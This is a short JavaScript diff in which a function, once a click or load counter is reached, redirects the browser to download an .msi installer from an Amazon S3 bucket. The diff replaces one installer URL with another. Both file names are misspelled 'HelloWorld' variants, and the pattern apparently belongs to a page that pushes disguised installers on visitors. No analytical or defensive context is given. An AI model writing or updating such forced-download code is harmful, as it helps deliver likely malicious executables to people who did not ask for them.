@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://helwr.s3.ap-southeast-2.amazonaws.com/helloVVolrd.msi";
+		var url="https://zh-wh01.s3.ap-southeast-2.amazonaws.com/Hollewonld.msi";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
